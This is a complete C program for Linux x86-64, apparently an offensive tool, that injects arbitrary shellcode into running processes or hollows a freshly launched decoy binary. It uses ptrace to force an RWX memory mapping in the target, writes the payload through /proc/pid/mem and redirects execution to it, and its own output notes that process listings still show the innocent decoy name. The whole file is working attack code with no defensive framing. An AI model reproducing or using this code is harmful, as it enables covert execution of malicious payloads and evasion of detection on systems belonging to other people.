#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>

static uintptr_t ptrace_mmap(pid_t pid, size_t len)
{
    struct user_regs_struct regs, saved;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0) return 0;
    memcpy(&regs, &saved, sizeof(regs));

    uint64_t saved_word;
    uintptr_t rip = (uintptr_t)saved.rip;

    errno = 0;
    long orig = ptrace(PTRACE_PEEKTEXT, pid, (void *)rip, NULL);
    if (errno) { perror("PEEKTEXT"); return 0; }
    saved_word = (uint64_t)orig;

    uint64_t sc_instr = (saved_word & ~0xffffULL) | 0xcc050fULL;
    ptrace(PTRACE_POKETEXT, pid, (void *)rip, (void *)sc_instr);

    regs.rax = __NR_mmap;
    regs.rdi = 0;
    regs.rsi = (uint64_t)len;
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.r8  = (uint64_t)-1;
    regs.r9  = 0;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) return 0;
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) return 0;

    int ws;
    waitpid(pid, &ws, 0);

    struct user_regs_struct post;
    ptrace(PTRACE_GETREGS, pid, NULL, &post);
    uintptr_t mapped = (uintptr_t)post.rax;

    ptrace(PTRACE_POKETEXT, pid, (void *)rip, (void *)saved_word);
    ptrace(PTRACE_SETREGS, pid, NULL, &saved);

    return mapped;
}

static int write_to_proc_mem(pid_t pid, uintptr_t addr, const void *data, size_t len)
{
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", (int)pid);
    int fd = open(mem_path, O_RDWR);
    if (fd < 0) { perror(mem_path); return -1; }
    ssize_t n = pwrite(fd, data, len, (off_t)addr);
    close(fd);
    return n == (ssize_t)len ? 0 : -1;
}

static void do_hollow(const char *decoy, char *const decoy_args[],
                      const unsigned char *shellcode, size_t sc_len)
{
    pid_t child = fork();
    if (child < 0) { perror("fork"); return; }

    if (child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execvp(decoy, decoy_args);
        perror("execvp"); _exit(1);
    }

    int ws;
    waitpid(child, &ws, 0);

    if (!WIFSTOPPED(ws) || WSTOPSIG(ws) != SIGTRAP) {
        fprintf(stderr, "[!] unexpected stop after exec: status=0x%x\n", ws);
        ptrace(PTRACE_KILL, child, NULL, NULL);
        return;
    }

    printf("[*] hollowing PID %d (%s)\n", (int)child, decoy);

    uintptr_t rwx_page = ptrace_mmap(child, 4096);
    if (!rwx_page || rwx_page > (uintptr_t)-4096LL) {
        fprintf(stderr, "[!] mmap in target failed (0x%lx)\n", rwx_page);
        ptrace(PTRACE_KILL, child, NULL, NULL);
        return;
    }
    printf("[*] allocated RWX page at 0x%lx in target\n", rwx_page);

    if (write_to_proc_mem(child, rwx_page, shellcode, sc_len) < 0) {
        fprintf(stderr, "[!] write to target failed\n");
        ptrace(PTRACE_KILL, child, NULL, NULL);
        return;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, child, NULL, &regs);
    regs.rip = (uint64_t)rwx_page;
    ptrace(PTRACE_SETREGS, child, NULL, &regs);

    ptrace(PTRACE_DETACH, child, NULL, NULL);
    printf("[+] detached - PID %d now runs our shellcode, ps shows '%s'\n",
           (int)child, decoy);
}

static int hex_decode(const char *hex, uint8_t *out, size_t max, size_t *outlen)
{
    size_t len = strlen(hex);
    if (len & 1) return -1;
    *outlen = len / 2;
    if (*outlen > max) return -1;
    for (size_t i = 0; i < *outlen; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%02x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static void do_inject(pid_t target, const uint8_t *shellcode, size_t sc_len)
{
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH"); return;
    }
    int ws; waitpid(target, &ws, 0);
    if (!WIFSTOPPED(ws)) {
        fprintf(stderr, "[!] target did not stop\n");
        ptrace(PTRACE_DETACH, target, NULL, NULL); return;
    }
    printf("[*] attached to PID %d\n", (int)target);

    size_t map_len = sc_len < 4096 ? 4096 : sc_len;
    uintptr_t rwx = ptrace_mmap(target, map_len);
    if (!rwx || rwx > (uintptr_t)-4096LL) {
        fprintf(stderr, "[!] mmap in target failed (0x%lx)\n", rwx);
        ptrace(PTRACE_DETACH, target, NULL, NULL); return;
    }
    printf("[*] RWX page at 0x%lx in PID %d\n", rwx, (int)target);

    if (write_to_proc_mem(target, rwx, shellcode, sc_len) < 0) {
        fprintf(stderr, "[!] shellcode write failed\n");
        ptrace(PTRACE_DETACH, target, NULL, NULL); return;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    regs.rip = (uint64_t)rwx;
    ptrace(PTRACE_SETREGS, target, NULL, &regs);

    ptrace(PTRACE_DETACH, target, NULL, NULL);
    printf("[+] detached — PID %d executing shellcode at 0x%lx\n", (int)target, rwx);
}

int main(int argc, char *argv[])
{
    if (argc < 4) {
usage:
        fprintf(stderr,
            "usage: %s exec   <decoy_bin> <shellcode_hex> [decoy_args...]\n"
            "       %s inject <pid>        <shellcode_hex>\n"
            "  shellcode_hex: raw bytes as lowercase hex, e.g. 9090eb fe\n",
            argv[0], argv[0]);
        return 1;
    }

    uint8_t sc[8192]; size_t sclen;

    if (strcmp(argv[1], "exec") == 0) {
        if (hex_decode(argv[3], sc, sizeof(sc), &sclen) < 0) {
            fprintf(stderr, "[-] invalid hex shellcode\n"); return 1;
        }
        const char *decoy = argv[2];
        char *dargs[64] = {};
        int nargs = 0;
        dargs[nargs++] = (char *)decoy;
        for (int i = 4; i < argc && nargs < 63; i++)
            dargs[nargs++] = argv[i];
        do_hollow(decoy, dargs, sc, sclen);
        return 0;
    }

    if (strcmp(argv[1], "inject") == 0) {
        pid_t target = (pid_t)atoi(argv[2]);
        if (target <= 0) { fprintf(stderr, "[-] bad pid\n"); return 1; }
        if (hex_decode(argv[3], sc, sizeof(sc), &sclen) < 0) {
            fprintf(stderr, "[-] invalid hex shellcode\n"); return 1;
        }
        do_inject(target, sc, sclen);
        return 0;
    }

    goto usage;
}
